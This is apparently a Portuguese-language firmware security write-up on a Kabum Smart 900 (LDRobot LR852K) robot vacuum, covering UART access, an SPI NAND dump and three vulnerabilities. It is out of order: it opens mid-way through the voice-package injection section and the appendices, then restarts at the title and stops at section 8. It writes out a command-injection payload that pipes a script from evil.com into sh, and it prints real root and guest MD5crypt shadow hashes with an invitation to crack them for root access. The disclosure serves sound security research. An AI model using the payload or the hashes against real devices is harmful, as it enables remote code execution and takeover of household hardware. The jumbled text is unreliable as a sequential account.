  rm -rf %s/%s && tar -zxf %s/%s -C %s && cp %s/Q001.mp3 %s/
  logado como: "voicd package apply cmd: %s"
  -> system()
Execução como root
```

### Verificação de download: só MD5

```plaintext
Offset 0xc844: "DownloadAndCheck, %s url is > %s : md5sum is > %s"
Offset 0xc96c: "DownLoadAndCheck md5 success"
Offset 0xc98c: "DownLoadAndCheck md5 error! should be:%s now:%s"
```

Sem RSA, ECDSA, Ed25519 ou qualquer string relacionada a assinatura criptográfica no path de verificação. MD5 verifica integridade contra corrupção de rede, não autenticidade. Um atacante que controle o conteúdo da resposta pode fornecer qualquer pacote com MD5 válido.

### Confirmação independente: script de boot (dump offset 0xa1bc00)

Um script de boot separado, que não faz parte do binário `network_proxy_2`, lê o config do pacote de voz e usa o ID diretamente em tar:

```sh
musicId=$(cat /userdata/cfg/music_cfg | grep voip_cur | awk -F'"' '{print $4}')
tar -zxf "/userdata/cfg/music/$musicId" -C /userdata/music
```

O `$musicId` vem do arquivo `music_cfg`, que é escrito pelo `voice_package.cpp` após download: `{"voip_cur" : "%s"}` (offset 0xa208). Essa é uma confirmação independente, um code path completamente separado que consome o mesmo dado sem sanitização.

**Restrição do awk.** O `awk -F'"' '{print $4}'` usa aspas duplas como delimitador. Isso significa que o `musicId` não pode conter aspas duplas (elas quebrariam a extração do campo). Mas `$(curl evil.com/s.sh | sh)` não contém aspas duplas e funciona perfeitamente como substituição de comando em shell.

### Mecanismo de injeção

Se o ID do pacote de voz contém metacaracteres shell:

```plaintext
Package ID:  x; curl http://evil.com/s.sh | sh; echo
Resultado:   rm -rf /userdata/cfg/music/sys/x; curl http://evil.com/s.sh | sh; echo && tar ...
Shell vê:    rm, depois curl|sh (payload do atacante), depois echo
```

### Vetor de ataque

**Primário.** Compromisso de conta Tuya cloud ou acesso à API de desenvolvedor. O metadata do pacote de voz (incluindo o ID usado como nome de arquivo) vem da nuvem Tuya. Se um atacante controla a resposta MQTT, controla o ID do pacote.

**Secundário.** MITM no fallback plaintext. O MQTT primário usa TLS na porta 8883, mas existe fallback HTTP em `http://a.tuyacn.com:80/d.json` e MQTT plaintext na porta 1883. Nesses paths, um MITM pode injetar metadata de pacote.

### Classificação de evidência

| Claim | Status |
| --- | --- |
| Format string shell com 7 %s não-sanitizados | **PROVEN**, offset 0xa018 |
| system() é o único mecanismo de exec | **PROVEN**, tabela de imports |
| Download verifica só MD5 | **PROVEN**, sem strings de assinatura |
| Script independente usa pkg\_id sem sanitização | **PROVEN**, script em dump 0xa1bc00 |
| Nenhuma função de sanitização no binário | **PROVEN**, grep zero resultados |
| snprintf alimenta system() | **STRONGLY INFERRED**, log + imports |
| ID do pacote chega ao format string | **STRONGLY INFERRED**, sem filtro visível |
| Cloud Tuya valida IDs de pacote | **UNKNOWN**, não verificável |

### CVSS

`AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H = 8.1`

*   **AV:N.** Acessível via cloud MQTT.
    
*   **AC:H.** Requer comprometimento de conta cloud ou posição MITM.
    
*   **PR:N.** Sem autenticação device-side pra pacotes OTA.
    
*   **C:H/I:H/A:H.** Root shell no device.
    

* * *

## 11\. Hashes de Senha Root

No dump NAND, encontrei entradas de `/etc/shadow` com hashes MD5crypt ($1$). São três hashes distintos, provavelmente de diferentes partições ou snapshots de filesystem dentro do NFTL:

```plaintext
root:$1$Ch3Jcvh9$2Q5Xng4bPbNnsQfTQpgcY.:0:0:99999:7:::
root:$1$JgO2yeod$HMMdc31757YjIEIeeARyQ/:0:0:99999:7:::
guest:$1$AzV2bLNj$GzHUVc2WOXyfiA6gWVkRF/:0:0:99999:7:::
```

MD5crypt. `$1$`. O algoritmo mais fraco que ainda aparece em sistemas Linux modernos. SHA-512crypt (`$6$`) é o padrão desde 2008. SHA-256crypt (`$5$`) é aceitável. MD5crypt é breakável por força bruta a taxas de milhões de tentativas por segundo em GPU moderna.

Duas hashes diferentes pra root sugerem que a senha foi alterada entre builds de firmware, ou que há múltiplos filesystems na NAND (partição ativa, partição de fallback, snapshot). O hash do guest confirma o que eu já sabia, conta com senha fraca ou vazia.

Não consegui quebrar os hashes do root com wordlists padrão (`rockyou.txt`, `SecLists/Passwords`). A senha não é trivial, o que é consistente com a observação de que o vendor não usou senhas-padrão genéricas. Mas MD5crypt com salt de 8 caracteres não resiste a um ataque focado com hashcat em GPU. É questão de tempo e compute.

Deixo os hashes aqui pra quem estiver "feeeling lucky". Se alguém quebrar, a recompensa é root completo no console UART de qualquer LR852K que tenha esse firmware.

* * *

## 12\. Caminho para Confirmação Completa

As duas vulnerabilidades de injeção de comando (VD-02 e VD-03) estão classificadas como STRONGLY INFERRED porque a cadeia `snprintf -> system()` não pôde ser verificada por trace de instruções ARM. A causa é o NFTL, que embaralha as páginas de código.

Existem dois caminhos pra converter de INFERRED pra CONFIRMED:

1.  **Dump com OOB data.** Dumpar a NAND incluindo os dados out-of-band (spare area de 128 bytes por página) no formato que o `ubireader` espera. Isso permitiria reconstruir o mapeamento lógico-físico do NFTL e montar o filesystem UBIFS, extraindo binários limpos pra disassembly completa.
    
2.  `dd` **no device vivo.** Se alguém obtiver root (por bruteforce do hash MD5crypt, por exploit serial ou por outra via), um simples `dd if=/dev/mtdblockX of=/tmp/partition.bin` extrairia as partições com mapeamento lógico já resolvido pelo kernel. Os ELFs sairiam limpos.
    

VD-01 (format string) já é CONFIRMED, com crashes documentados por logs do NAND e padrão inequívoco de comportamento.

* * *

## 13\. Reflexões

### O modelo de ameaça de verdade

Alguém pode olhar pra isso e perguntar: "mas por que caralhos alguém iria pegar meu robô e fazer um dump complicado?". É uma pergunta válida, e a resposta é que as vulnerabilidades sérias (VD-01, VD-02, VD-03) não exigem acesso físico ao robô.

VD-01 é um DoS pela internet, qualquer pessoa com acesso à conta Tuya do dispositivo pode crashar o daemon de rede remotamente, repetidamente. VD-02 é injeção de comando pela rede local, durante o pareamento WiFi ou com o `localKey` Tuya. VD-03 é injeção de comando pela internet, via comprometimento da nuvem Tuya ou MITM no fallback plaintext.

O dump físico foi o método de descoberta, não o método de ataque. Eu precisei extrair o firmware pra encontrar as vulnerabilidades. Um atacante não precisa do firmware pra explorá-las.

### Aspirador conectado é um computador Linux na sua rede

Um robô aspirador conectado é um computador Linux com root rodando na sua rede doméstica, com microfone (em alguns modelos), câmera (em modelos com navegação visual) e mapeamento detalhado da planta da sua casa. Ele sabe o layout dos seus cômodos, sabe quando você está em casa (baseado em agendamento e sensores) e mantém uma conexão persistente com um servidor na internet.

O mercado de IoT doméstico trata segurança como feature opcional. O fato de que a LDRobot compilou com FORTIFY\_SOURCE e colocou uma senha não-trivial no root já coloca esse dispositivo acima da média do segmento, e mesmo assim encontrei três vulnerabilidades, duas delas com injeção de comando direta.

### A maldição do NFTL

A maior frustração dessa pesquisa foi o NFTL. Em todos os roteadores que analisei antes (ZTE F689, TP-Link RE305), o firmware era extraível limpo, NOR flash com filesystem SquashFS direto, ou NAND com layout previsível. O Allwinner NFTL é uma camada de complexidade que impede análise estática profunda a partir do dump bruto.

Ironicamente, o NFTL não é uma medida de segurança. Ele existe pra wear leveling e bad block management, necessidades operacionais da NAND flash. Mas o efeito colateral é que funciona como uma forma acidental de ofuscação. Strings são legíveis, mas fluxo de controle não. É o suficiente pra encontrar vulnerabilidades por padrão de strings, mas não o suficiente pra confirmar com certeza absoluta via disassembly.

### O ecossistema Tuya

Tuya é a plataforma IoT que roda por baixo de centenas de marcas white-label. O SDK Tuya (versão 4.3.1 neste dispositivo) fornece conectividade MQTT, protocolo LAN, OTA update e gerenciamento de data points. A exposição não é específica da LDRobot. Qualquer dispositivo usando o Tuya SDK com padrão semelhante de construção de comandos shell sem sanitização está potencialmente vulnerável.

A ausência de assinatura criptográfica nos pacotes de voz (VD-03) é uma decisão do SDK ou do fabricante. MD5 é verificação de integridade, não de autenticidade. Qualquer pipeline de update que use MD5 como única verificação está a uma posição de MITM de distância da execução de código arbitrário.

* * *

## Apêndice A. Sumário dos Achados

| ID | Título | CWE | CVSS 3.1 | Confiança |
| --- | --- | --- | --- | --- |
| VD-01 | Format String em Tuya dpid 127 (DoS) | CWE-134 | 6.5 Medium | CONFIRMED |
| VD-02 | Command Injection via WiFi SSID/Password | CWE-78 | 7.1 High | STRONGLY INFERRED |
| VD-03 | Command Injection via Voice Package Filename | CWE-78 | 8.1 High | STRONGLY INFERRED |

## Apêndice B. Binários Analisados

```plaintext
network_proxy_2 (~1.9 MB, ELF dinâmico ARM)
  - daemon principal de rede e Tuya SDK
  - imports: system(), __printf_chk, __snprintf_chk, __sprintf_chk,
    __vsnprintf_chk, __memcpy_chk, __strcpy_chk, __stack_chk_fail
  - afetado por: VD-01, VD-02

voice package library (~100 KB, ELF dinâmico ARM)
  - biblioteca de gerenciamento de pacotes de voz
  - source: network_proxy_2/src/logic/voice_package.cpp
  - imports: system(), __snprintf_chk, __memcpy_chk, __stack_chk_fail
  - afetado por: VD-03

CleanPackApp (~540 KB, ELF estático ARM)
  - aplicação principal do robô (orquestração)
  - contém strings de "downloadAndApply", "getVoicePackageInfo"
  - afetado por: VD-03 (orquestração de download)

cleanpack_mode (shell script)
  - script de configuração WiFi/AP
  - recebe SSID sem sanitização
  - afetado por: VD-02
```

## Apêndice C. Ferramentas Utilizadas

| Ferramenta | Uso |
| --- | --- |
| SNANDer + CH341A | Dump da SPI NAND (XT26G01CWSIG) via SPI |
| Flipper Zero em Modo Bridge (fancy, não tenho um USB UART) | Acesso serial ao console UART (115200 8N1) |
| tio | Terminal serial com logging |
| strings + grep | Análise de rodata e scripts embarcados |
| readelf | Headers e import tables dos ELFs extraídos |
| hexdump / xxd | Inspeção binária de offsets específicos |
| Python (pyserial) | Scripts de extração, fuzzing de dpids, automação |
| Radare2 | Tentativa de disassembly (limitada pelo NFTL) |
| hashcat | Tentativa de bruteforce dos hashes MD5crypt |
| Ferro de solda (ponta fina) | Soldagem in-circuit nos pads WSON8 |
| Lupa / microscópio | Inspeção visual das soldas e dos pads |

## Apêndice D. Dump SHA256

```plaintext
SHA256 (dump.bin)  = 00ea975770c88095c2c780b02b3b675879ef104078cf41e14647a43c12c08fa8
SHA256 (dump2.bin) = 00ea975770c88095c2c780b02b3b675879ef104078cf41e14647a43c12c08fa8
```

128 MB (134.217.728 bytes). Dois dumps independentes, checksums idênticos.
# Análise de Segurança de Firmware no Kabum Smart 900 (LDRobot LR852K): Extração via SPI NAND e Descoberta de Vulnerabilidades

**Dispositivo:** Kabum Smart 900 (white-label; o firmware se identifica como LDRobot LR852K, marca de consumo VeniiBOT) **SoC:** Allwinner R328-S3 (sun8iw18, ARM Cortex-A7) **Firmware:** CleanPack3, versão `mr112-LR852K-0_1_12-Release-UDisk` **SDK Tuya:** WiFi+SD SDK V:4.3.1, protocolo LAN 3.3

## 1\. Introdução

Comprei um robô aspirador vendido no Brasil como Kabum Smart 900. Dispositivo barato, com integração Tuya pra controle pelo app. WiFi, LiDAR, aspiração, mop, a proposta padrão do segmento de robôs conectados. Não comprei pra pesquisa. Comprei pra limpar a casa.

![](/assets/img/kabum-smart-900-ldrobot-lr852k/img-09.png)

Uma coisa que vale dizer logo de cara, porque explica todas as strings que aparecem daqui pra frente: por fora a caixa diz Kabum Smart 900, mas por dentro o firmware se identifica como **LDRobot LR852K**, com a marca de consumo VeniiBOT. É white-label clássico. A Kabum vende sob marca própria um robô fabricado pela LDRobot (Shenzhen LDRobot), então o board, o framework de firmware (`cleanpack3`) e os domínios (`veniibot.com`) apontam todos pra LDRobot. Quando eu falar "LR852K" no resto do paper, é esse mesmo bicho na sua caixa da Kabum.

Depois de uns meses usando, comecei a pensar no que aquele dispositivo realmente fazia na minha rede. O app Tuya controla tudo: agenda, potência, mapeamento, pacotes de voz. O robô mantém uma conexão MQTT persistente com a nuvem Tuya (porta 8883 TLS, fallback 1883 plaintext). Recebe comandos, manda telemetria, aceita atualizações de firmware OTA. É um computador Linux rodando como root na minha rede doméstica, permanentemente conectado a um servidor chinês, com uma exposição que eu nunca tinha olhado.

Resolvi olhar.

O que se seguiu foram semanas de engenharia reversa: soldagem de fios em chip NAND sob lupa, dumps de 128 MB via SPI, luta contra o Allwinner NFTL que embaralha páginas e impede extração limpa de binários, fuzzing de data points Tuya, e análise estática de strings em ELFs parcialmente corrompidos. No final encontrei três vulnerabilidades. Uma format string confirmada, com DoS demonstrado, e duas injeções de comando OS fortemente inferidas a partir de evidências em rodata e scripts embarcados.

Também apelei para o reddit ([https://www.reddit.com/r/hardwarehacking/comments/1vnpnzc/stuck\_in\_lowprivilege\_uart\_shell\_on\_liectroux\_g7/](https://www.reddit.com/r/hardwarehacking/comments/1vnpnzc/stuck_in_lowprivilege_uart_shell_on_liectroux_g7/)) pois identifiquei os pinos de UART e o restante é desconhecido para mim. Vi que esses robôs geralmente possuem modo FEL e para isso utiliza uma porta USB OTG que não existe no meu. Também não consegui identificar os pads de d+/d- para tentar uma conexão direta via USB, que com modo FEL provavelmente deixaria esse post beeeeem menor e mais produtivo. Vida que segue.

Segue o fio.

* * *

## 2\. Visão Geral do Dispositivo

| Componente | Valor |
| --- | --- |
| SoC | Allwinner R328-S3 (sun8iw18), dual ARM Cortex-A7 @ ~1 GHz (1008 MHz no boot log) |
| RAM | DDR3, 128 MiB, 792 MHz (integrada ao SoC) |
| Flash | XT26G01CWSIG SPI NAND, 1 Gbit (128 MB), 2048+128 bytes/página, WSON8 8x6 mm |
| Bootloader | U-Boot Allwinner (branch tina) |
| Kernel | Linux (build OpenWrt/Linaro GCC 6.4-2017.11) |
| Userspace | Tina Linux (derivado OpenWrt), init procd |
| Board ID | mr112 |
| Console UART | ttyS0, 115200 8N1 |
| Conectividade | WiFi 2.4 GHz (Tuya IoT SDK), sem Bluetooth, sem USB exposto |
| Sensores | LiDAR, bumper, cliff, giroscópio |
| Build CI | Jenkins em `/var/lib/jenkins/workspace/cleanpack3/` |
| SDK de build | `/home/peter/r328_sdk/` |
| Tuya SDK | WiFi+SD SDK V:4.3.1 |

O Allwinner R328 é um SoC de aplicação genérico, encontrado em caixas de som inteligentes, painéis de controle e aparelhos IoT de consumo. Roda ARM Cortex-A7, arquitetura ARMv7-A, com NEON. O firmware é baseado em Tina Linux, a distro OpenWrt que a Allwinner mantém pros seus SoCs. O toolchain é OpenWrt/Linaro GCC 6.4-2017.11, versão 6.4.1. Uma observação já aqui: o boot log do U-Boot reporta CPU a 1008 MHz, então uso esse número em vez do clock máximo de datasheet.

A flash é uma SPI NAND de 1 Gbit da XTX Technology, modelo XT26G01CWSIG. Package WSON8 (8x6 mm), com ECC de 8 bits on-die e spare area de 128 bytes por página. Isso é relevante porque SPI NAND não é SPI NOR. SPI NOR é linear, byte-endereçável, trivial de dumpar. SPI NAND opera em páginas de 2048 bytes com spare area, usa ECC interno, e no caso do Allwinner roda sobre NFTL (NAND Flash Translation Layer), uma camada de mapeamento página a página que embaralha a localização física dos dados. Isso vai ser o maior obstáculo da análise.

O build indica integração contínua Jenkins, com path de workspace apontando pra `cleanpack3`, que é o framework de firmware da LDRobot. O SDK de compilação em `/home/peter/r328_sdk/` confirma que o firmware é compilado a partir do SDK oficial da Allwinner, provavelmente um R328 SDK Tina Linux.

* * *

## 3\. Acesso Físico e UART

### Abrindo o robô

Abrir um robô aspirador não é como abrir um roteador. Roteador tem dois parafusos, uns clipes e uma PCB. Robô aspirador tem parafusos escondidos sob adesivos, clips que parecem de encaixe mas são de pressão, e um empilhamento de módulos que dificulta enxergar o que é PCB principal e o que é PCB de motor.

Removi a tampa inferior, desparafusei o módulo LiDAR e cheguei na PCB principal. Encontrei um header JST de 9 pinos, não vazado, no canto da placa. Debug header clássico de produção, provavelmente o vendor usa pra diagnóstico em fábrica e nunca desabilitou.

![](/assets/img/kabum-smart-900-ldrobot-lr852k/img-10.png)

Um detalhe interessante: Após abrir tudo, desmontar completamente, eu percebi que só de tirar a tampa superior e desparafusar o case do LIDAR eu teria acesso a esses pinos de debug lol (a imagem a seguir é um trabalho porco de solda após quebrar o JST, não leve a sério).

![](/assets/img/kabum-smart-900-ldrobot-lr852k/img-11.png)

### Identificação dos pinos

Sem silkscreen, fui por multímetro e por tentativa. Dos 9 pinos, identifiquei:

| Pino | Função |
| --- | --- |
| 4 | RX (entrada do SoC) |
| 5 | TX (saída do SoC) |
| 7 | GND |

TX em idle marca 3.3 V constante e oscila durante o boot. RX puxa pull-up fraco. GND dá continuidade com o terra do chassis. Os outros pinos eu não investiguei além do voltímetro. Podem ser JTAG, GPIO de teste ou alimentação.

### Conexão serial

![](/assets/img/kabum-smart-900-ldrobot-lr852k/img-12.png)

Conectei via bridge usando um Flipper Zero em UART bridge, com os fios cruzados (TX do alvo no RX do bridge, e vice-versa). Baud rate 115200, configuração 8N1, que é o padrão pra Allwinner. Confirmei posteriomente pelo kernel cmdline que aparece no boot log:

```plaintext
console=ttyS0,115200
```

O boot log saiu limpo, legível, sem caracteres corrompidos. Capturei com `tio`:

```bash
tio -b 115200 -t -l --log-file ~/pesquisa/robo/uart_capture.log /dev/ttyUSB0
```

* * *

## 4\. Reconhecimento Inicial

### U-Boot

O boot começa com o banner do U-Boot Allwinner. Vi o log de inicialização do SoC, a configuração de DRAM, a detecção da NAND flash (`xt26g01c` identificado pelo driver). Tentei interromper o boot pra cair no CLI do U-Boot.

Não consegui.

Mandei `Enter`, `Escape`, `Ctrl+C`, `espaço`, toda combinação que conheço, durante a janela de boot. O bootloader simplesmente ignora. Provavelmente a janela de `bootdelay` está zerada ou a interrupção foi desabilitada no build. Sem acesso ao CLI do U-Boot, perdi a capacidade de dumpar flash por `md.b` (como fiz no TP-Link RE305), de inspecionar o environment e de fazer TFTP boot. O robô boota direto pro Linux.

### Shell de guest

Quando o Linux termina de bootar, o console UART cai num prompt de login. Testei combinações padrão. Root pede senha. Tentei as clássicas de dispositivos chineses: `admin`, `root`, `1234`, `12345`, `password`, `toor`, senha vazia. Nenhuma funcionou.

Insanamente, o robô mesmo sendo chinês não tinha uma senha padrão como as vistas no mercado. Em roteadores baratos da Tenda, da Intelbras, do mercado genérico, a senha root é `admin` ou vazia. Aqui não. Alguém no time da LDRobot fez o mínimo de segurança e colocou uma senha real no root.

Tentei `guest`. Sem senha. Entrou.

O shell do guest é extremamente restrito. Não é um BusyBox completo, não é um `sh` funcional. Dos comandos que testei:

*   `ls`, `cat`, `echo` funcionam
    
*   `ps`, `top`, `netstat` inexistentes ou bloqueados
    
*   `cd /` funciona, mas a maioria dos diretórios relevantes (`/proc`, `/sys`, `/dev`) tem permissões limitadas
    
*   `id` retorna `uid=500(guest)`, sem nenhum grupo privilegiado
    
*   `su root` su não é um suid e não funciona.
    
*   qualquer tentativa de acessar binários do sistema ou listar processos é bloqueada
    

É a diferença entre ter um shell e ter acesso. O guest vê quase nada. Os binários interessantes (`network_proxy_2`, `CleanPackApp`) rodam como root e não são legíveis pelo guest. Os diretórios de configuração em `/userdata/` têm permissões restritas. Consegui ver o hostname, a versão de firmware (`mr112-LR852K-0_1_12-Release-UDisk`) e pouco mais.

A limitação do shell de guest foi o que me empurrou pro caminho do dump de flash. Se eu tivesse root, poderia ter feito `dd if=/dev/mtdX` e extraído tudo limpo. Sem root, a única opção era ir pro hardware.

* * *

## 5\. Extração de Firmware

### O chip

A flash é um XT26G01CWSIG da XTX Technology. SPI NAND, 1 Gbit (128 MB), package WSON8 (8x6 mm). WSON8 é um package plano, sem pinos expostos. Os contatos são pads na parte inferior do chip, rente à PCB.

![](/assets/img/kabum-smart-900-ldrobot-lr852k/img-13.png)

### Tentativa com clip (fracasso)

Primeira tentativa foi a abordagem rápida: programador CH341A com clip SOP8/WSON8, leitura in-circuit sem dessoldar. Funciona perfeitamente em SPI NOR com package SOP8, onde os pinos ficam expostos nas laterais do chip e o clip agarra bem.

WSON8 é outra história. Os pads ficam embaixo do chip. O clip de teste que eu tinha simplesmente não conseguia fazer contato confiável. Encostava em um pad, perdia outro. Às vezes lia lixo, às vezes não detectava o chip. Perdi horas tentando posicionar o clip de formas criativas. Não funcionou.

Para complicar ainda mais, toda a placa é revestida com um plástico/silicone que provavelmente seja para proteger a placa de umidade e água (o robô passa pano).

![](/assets/img/kabum-smart-900-ldrobot-lr852k/img-14.png)

### Soldagem in-circuit

A solução foi soldar fios diretamente nos pads do chip. Com o chip ainda montado na PCB (in-circuit), soldei micro fios esmaltados nos 8 pads do WSON8 usando ferro de solda com ponta fina e auxílio de lupa. Cada fio com menos de 1 cm entre o pad e um ponto de ancoragem na PCB, pra evitar que tensão mecânica arrancasse a solda.

Os sinais relevantes pra leitura SPI:

| Pino WSON8 | Sinal | Conexão |
| --- | --- | --- |
| 1 | CS# (Chip Select) | CH341A CS |
| 2 | SO/IO1 (Data Out) | CH341A MISO |
| 3 | WP#/IO2 | Pull-up 3.3V |
| 4 | GND | CH341A GND |
| 5 | SI/IO0 (Data In) | CH341A MOSI |
| 6 | CLK | CH341A CLK |
| 7 | HOLD#/IO3 | Pull-up 3.3V |
| 8 | VCC | CH341A 3.3V |

Nada fancy, mas funciona.

![](/assets/img/kabum-smart-900-ldrobot-lr852k/img-15.png)

A leitura in-circuit tem um risco: o SoC também está conectado aos mesmos pinos SPI. Se o SoC estiver ativo, ele pode driving o barramento e corromper a leitura. A mitigação é manter o SoC em reset durante a leitura, ou pelo menos garantir que ele não esteja driving os pinos SPI. No meu caso, alimentei o chip pela 3.3 V do CH341A com o robô desligado. O regulador principal do robô ficou inativo, então o SoC não tinha alimentação pra interferir. Funcionou, mas é a abordagem rude. Em cenários mais limpos, dessoldar o chip seria mais seguro.

### SNANDer e o dump

Usei o SNANDer, ferramenta open-source de leitura e escrita de SPI NAND (além de NOR e EEPROM) via CH341A, pra ler a flash. O SNANDer suporta SPI NAND, detectou o XT26G01CWSIG pelo JEDEC ID e fez o dump completo de 128 MB:

```bash
./SNANDer -r dump.bin
```

O dump levou uns 20 minutos. 128 MB de dados brutos, incluindo a spare area de 128 bytes por página (usada pra ECC e metadados do NFTL).

![](/assets/img/kabum-smart-900-ldrobot-lr852k/img-16.png)

### Validação: dois dumps

Fiz dois dumps independentes (desconectei, reconectei, re-dumpei) e comparei:

```bash
sha256sum dump.bin dump2.bin
# 00ea975770c88095c2c780b02b3b675879ef104078cf41e14647a43c12c08fa8  dump.bin
# 00ea975770c88095c2c780b02b3b675879ef104078cf41e14647a43c12c08fa8  dump2.bin
```

Checksums idênticos. A leitura é determinística e a soldagem está boa. Se houvesse contato intermitente ou interferência do SoC, os dumps divergiriam. Dois dumps iguais significam leitura confiável.

* * *

## 6\. Análise do Firmware

### O problema do NFTL

Aqui começou o inferno.

Em dispositivos com SPI NOR (como o TP-Link RE305 que analisei antes), a flash é linear. Byte 0 do dump é o byte 0 da flash. Binwalk roda, extrai squashfs, pronto. Análise direta.

Em dispositivos com SPI NAND sob Allwinner, a história é completamente diferente. O Allwinner usa um NFTL proprietário que faz mapeamento página a página. As páginas lógicas que o sistema operacional vê não estão nas mesmas posições físicas no chip. O NFTL redistribui páginas pra wear leveling, bad block management e garbage collection. O dump bruto que eu tenho é a visão física da flash, com as páginas embaralhadas.

Na prática, isso significa que:

1.  **Strings em rodata são legíveis.** Strings de texto ficam dentro de páginas individuais, e a maioria cabe em uma única página de 2048 bytes. O NFTL embaralha a ordem das páginas, mas o conteúdo de cada página está intacto. `strings` no dump bruto funciona perfeitamente.
    
2.  **Binários ELF não são extraíveis de forma limpa.** Um ELF de 1.9 MB ocupa centenas de páginas. O NFTL embaralha a ordem dessas páginas. Os headers ELF ficam na primeira página (intactos), mas as seções de código (.text) estão distribuídas em páginas fora de ordem. O binário não disassembla corretamente.
    
3.  **O filesystem UBI/UBIFS não é montável.** O dump bruto não contém os metadados OOB no formato que o `ubireader` espera. Seria necessário um dump com os dados OOB separados, ou acesso ao device vivo pra extrair via `dd` das partições MTD.
    

Essa é a razão pela qual as vulnerabilidades de injeção de comando estão classificadas como STRONGLY INFERRED em vez de CONFIRMED. Eu consigo ver as strings formatadoras, os imports de `system()`, a ausência de sanitização, mas não consigo disassemblar o fluxo de instruções pra provar que `snprintf` alimenta `system()` diretamente, porque as páginas de código estão embaralhadas pelo NFTL.

### O que funcionou

Apesar do NFTL, a análise estática por strings foi extremamente produtiva. O dump de 128 MB contém toda a informação textual do firmware:

*   **Source annotations.** Paths completos de arquivos-fonte como `network_proxy_2/src/base/wifi_config_base.cpp` e `network_proxy_2/src/logic/voice_package.cpp`. O compilador embarcou as anotações de `__FILE__` nos binários.
    
*   **Format strings.** Comandos shell completos como `sh /data/bin/cleanpack_mode -m sta -s "%s" -p "%s"` e `rm -rf %s/%s && tar -zxf %s/%s -C %s && cp %s/Q001.mp3 %s/`.
    
*   **Log messages.** Strings de debug que documentam o fluxo: `"wifi cmd %s"`, `"voicd package apply cmd: %s"`, `"wifi pwd is less than 8 char"`.
    
*   **Import tables.** As tabelas de símbolos dinâmicos dos ELFs ficam nas primeiras páginas e sobrevivem ao NFTL. Pude listar imports como `system()`, `__snprintf_chk`, `__printf_chk`, `__stack_chk_fail`.
    
*   **Shell scripts.** Scripts embarcados no filesystem aparecem como texto plano no dump. Encontrei `cleanpack_mode`, scripts de boot, configs do sistema.
    
*   **Password hashes.** O `/etc/shadow` aparece em texto claro no dump.
    

O NFTL também causa duplicação. O wear leveling copia páginas pra diferentes blocos físicos, então a mesma string aparece em múltiplos offsets do dump. Isso inicialmente confunde (por que a string aparece 5 vezes?), mas na prática funciona como confirmação. Se um format string aparece em 5 offsets distintos com o mesmo conteúdo, é certamente código de produção, não dead code nem string remanescente de uma versão anterior.

### Extração parcial de ELFs

Consegui extrair ELFs parciais buscando por magic bytes (`\x7fELF`) no dump e recortando a partir daí. Os headers ELF, program headers e tabelas de símbolos ficam no início do arquivo e geralmente estão na mesma página ou em páginas consecutivas que por acaso não foram reorganizadas. Extraí 25 binários únicos, dos quais os mais relevantes:

| Binário | Tamanho | Tipo | Identificação |
| --- | --- | --- | --- |
| network\_proxy\_2 | ~1.9 MB | ELF dinâmico | Daemon principal de rede, Tuya SDK |
| CleanPackApp | ~540 KB | ELF estático | Aplicação principal do robô |
| voice package lib | ~100 KB | ELF dinâmico | Biblioteca de pacotes de voz |

Os headers e imports desses ELFs são legíveis. As seções de código não são. As instruções ARM estão em páginas embaralhadas. É possível disassemblar trechos individuais de uma página, mas não reconstituir o fluxo de controle entre páginas.

### Ferramentas

*   **SNANDer.** Dump da SPI NAND via CH341A.
    
*   **strings + grep.** Análise principal de rodata e scripts embarcados.
    
*   **hexdump / xxd.** Inspeção binária de offsets específicos.
    
*   **readelf.** Leitura de headers e import tables dos ELFs extraídos.
    
*   **Python.** Scripts de extração e correlação de offsets.
    
*   **Radare2.** Tentativa de disassembly, limitada pelo NFTL.
    

* * *

## 7\. Postura de Segurança da Plataforma

Antes de entrar nas vulnerabilidades específicas, vale documentar o que a plataforma faz certo e o que não faz. Isso contextualiza o impacto real de cada achado.

### FORTIFY\_SOURCE, presente e ativo

O toolchain GCC 6.4 compilou os binários com `FORTIFY_SOURCE`. Confirmei pela presença de funções hardened nas tabelas de importação.

**network\_proxy\_2 (daemon principal):**

```plaintext
__memcpy_chk
__printf_chk
__snprintf_chk
__sprintf_chk
__vsnprintf_chk
__strcpy_chk
__stack_chk_fail
__stack_chk_guard
```

**voice package library:**

```plaintext
__fdelt_chk
__memcpy_chk
__snprintf_chk
__stack_chk_fail
__stack_chk_guard
```

As funções `_chk` são as versões hardened da glibc que verificam buffer overflows e format string abuse em runtime. `__stack_chk_fail` e `__stack_chk_guard` são o mecanismo de stack canary. A presença desses símbolos nos imports dinâmicos significa que eles são de fato chamados, não é código morto.

Isso tem implicação direta na VD-01 (format string). O `%n` em format strings controladas pelo atacante é bloqueado pelo FORTIFY. A glibc detecta `%n` em segmento writable e chama `abort()`, produzindo SIGABRT em vez de SIGSEGV. O impacto é DoS (crash), não RCE (execução de código). Mais detalhes na seção da vulnerabilidade.

### O que está ausente

*   **Nenhuma sanitização de entrada pra shell commands.** Não encontrei nenhuma função com nome sugestivo de sanitização (`escap`, `sanitiz`, `filter`, `quot`, `shell`) nos binários analisados. Os format strings de comando shell usam `%s` direto.
    
*   **Verificação de integridade de pacotes só com MD5.** Downloads de pacotes de voz são verificados com MD5 apenas. Sem assinatura criptográfica (RSA, ECDSA, Ed25519). MD5 não é verificação de autenticidade.
    
*   **Root everywhere.** Os serviços principais rodam como root. O `network_proxy_2` processa dados de rede como root. O `system()` que ele chama executa como root. Não há separação de privilégios, não há containers, não há seccomp. Compromisso do daemon é root completo no device.
    

### GCC e toolchain

```plaintext
OpenWrt/Linaro GCC 6.4-2017.11 6.4.1
```

GCC 6.4 é de 2017. Não é antigo a ponto de ser escandaloso (já vi kernel 2.6.36 de 2010 no TP-Link RE305), mas está a várias gerações major de distância das mitigações modernas. O `-fstack-protector-strong` está presente (evidenciado pelos canaries), o `FORTIFY_SOURCE` está presente (nível 1 ou 2), mas mitigações como CFI (Control Flow Integrity) e shadow call stacks exigem GCC 8+ ou Clang.

* * *

## 8\. VD-01: Format String em Tuya dpid 127

**CWE:** CWE-134 (Use of Externally-Controlled Format String) **Confiança:** CONFIRMED, DoS demonstrado com 3 crashes independentes **CVSS 3.1:** 6.5 (`AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H`)

### Contexto

O protocolo Tuya define "data points" (dpids) como canais de dados entre o app e o dispositivo. Cada dpid tem um ID numérico e transporta dados em formato JSON. O dpid 127 é usado pelo LR852K pra receber informações do app, processadas pelo handler `HandleRawData` no daemon `network_proxy_2`.

### Descoberta

